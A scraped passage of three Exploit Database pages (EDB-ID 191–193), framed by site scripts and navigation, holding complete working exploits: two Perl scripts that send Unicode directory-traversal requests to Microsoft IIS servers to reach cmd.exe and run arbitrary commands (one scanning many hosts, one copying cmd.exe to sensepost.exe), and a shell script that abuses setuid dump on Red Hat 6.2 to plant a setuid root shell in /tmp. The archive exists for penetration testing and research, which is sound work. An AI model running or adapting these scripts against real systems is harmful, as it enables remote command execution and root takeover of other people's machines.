"=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 191
Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (7) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (7)EDB-ID:191CVE:2000-0884EDB Verified:Author:steeLeType:remoteExploit:/Platform:WindowsDate:2000-11-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## IIS 4.0/5.0 Unicode Exploit# Checks for each script that has been posted on the BugTraq Lis# Shouts to bighawk(thats for help), datagram, Ghost Rider, The Duke, p4, kript0n and others# Since It Uses fork(), you gotta keep up with whats happening. Or Just Let it run and it will# log sites in the log_unicode.log.# So Simple# Use Socketuse Socket;# incase no arguements or less arguements are givenif(@ARGV == '0' || @ARGV < 2) { die "IIS 4.0/5.0 Unicode Exploit\n"."Programmed by SteeLe\n"."Usage: ./$0 <single host> <dir for exploit>\n"; }# Variables$blah = $ARGV[0];$port = 80;$dir = $ARGV[1];$timeout = 4;# see if file is there,if (-e "$blah") {open(T, "$blah") || die "can't open $blah\n";@target = <T>;close(T);}else { @target[0] = $blah; } # what you think is blah# all scripts mentioned on bugtraq, we know rfp knows more.@scripts = ("..%c1%1c..", "..%c0%9v..", "..%c0%af..", "..%c0%qf..", "..%c1%8s..", "..%c1%9c..","..%c1%pc.."); # blah, i know i'm not l33t# Open LOG Scriptopen(LOG, ">>log_unicode.log") || die "couldn't open a file for writing\n";# Socket Stuffforeach $script (@scripts) {$submit = "GET /scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir HTTP/1.0 \n\r\n\r";$ouch = "/scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir";foreach $site (@target) {unless(fork()) {chop($site) if $site =~ /\n$/; &connect($site);} # so i lied}}sub connect { # real socket stuffmy ($ste) = @_;$iaddr = inet_aton($ste) || die "$ste might not be up, connecting to next site....\n";$paddr = sockaddr_in($port, $iaddr);$proto = getprotobyname('tcp');local $SIG{ALRM} = sub { print "TimeOut On $ste, going to next one....\n" && exit(0) };alarm $timeout;socket(SCAN, PF_INET, SOCK_STREAM, $proto) || die("Error: couldn't make a socket to $ste");connect(SCAN, $paddr) || die "Sorry couldn't connect to $ste, connecting to next site....\n";send(SCAN, $submit, 0);$blackout = <SCAN>;($http,$code,$blah) == split(/ /, $blackout);if ($code == "200") {print "$ste has $ouch on there, go exploit it\n";print LOG "$ste has $ouch on there\n";}else { print "$ste doesn't have it\n"; }close(SCAN);exit(0);}close(LOG);# since we're doneexit;# milw0rm.com [2000-11-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 192
Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (8) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (8)EDB-ID:192CVE:2000-0884EDB Verified:Author:Roelof TemminghType:remoteExploit:/Platform:WindowsDate:2000-11-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## See http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806## Very simple PERL script to execute commands on IIS Unicode vulnerable servers# Use port number with SSLproxy for testing SSL sites# Usage: unicodexecute2 IP:port command# Only makes use of "Socket" library## New in version2:# Copy the cmd.exe to something else, and then use it.# The script checks for this.# Thnx to security@nsfocus.com for discovering the cmd.exe copy part## Roelof Temmingh 2000/10/26# roelof@sensepost.com http://www.sensepost.comuse Socket;# --------------initif ($#ARGV<1) {die "Usage: unicodexecute IP:port command\n";}($host,$port)=split(/:/,@ARGV[0]);$target = inet_aton($host);# --------------test if cmd has been copied:$failed=1;$command="dir";@results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");foreach $line (@results){if ($line =~ /sensepost.exe/) {$failed=0;}}$failed2=1;if ($failed==1) {print "Sensepost.exe not found - Copying CMD...\n";$command="copy c:\\winnt\\system32\\cmd.exe sensepost.exe";$command=~s/ /\%20/g;@results2=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");foreach $line2 (@results2){if (($line2 =~ /copied/ )) {$failed2=0;}}if ($failed2==1) {die "Copy of CMD failed - inspect manually:\n@results2\n\n"};}# ------------ we can assume that the cmd.exe is copied from here..$command=@ARGV[1];print "Sensepost.exe found - Executing [$command] on $host:$port\n";$command=~s/ /\%20/g;my @results=sendraw("GET /scripts/..%c0%af../inetpub/scripts/sensepost.exe?/c+$command HTTP/1.0\r\n\r\n");print @results;# ------------- Sendraw - thanx RFP rfp@wiretrip.netsub sendraw {   # this saves the whole transaction anywaymy ($pstr)=@_;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||die("Socket problems\n");if(connect(S,pack "SnA4x8",2,$port,$target)){my @in;select(S);      $|=1;   print $pstr;while(<S>){ push @in, $_;}select(STDOUT); close(S); return @in;} else { die("Can't connect...\n"); }}# Spidermark: sensepostdata# milw0rm.com [2000-11-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 193
dump 0.4b15 - Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDdump 0.4b15 - Local Privilege EscalationEDB-ID:193CVE:2000-1009EDB Verified:Author:matType:localExploit:/Platform:LinuxDate:2000-11-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh# Redhat 6.2 dump command executes external program# with suid priviledge.# Discovered by Mat <mat@hacksware.com># Written for and by a scriptkid Tasc ;P# Remember, there's no cure for BSEecho "dump-0.4b15 root exploit"echo "Discovered by Mat <mat@hacksware.com>"echo "-------------------------------------"echoDUMP=/sbin/dumpif [ ! -u $DUMP ]; thenecho "$DUMP is NOT setuid on this system or does not exist at all!"echoexit 0fiexport TAPE=iamlame:iamlameexport RSH=/tmp/rshcat >/tmp/rsh <<__eof__#!/bin/shcp /bin/sh /tmp/sushchmod 4755 /tmp/sush}__eof__chmod 755 /tmp/rsh/sbin/dump -0 /echoecho "Waiting for rootshell .... 5 seconds...."sleep 5/tmp/sushid# milw0rm.com [2000-11-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if 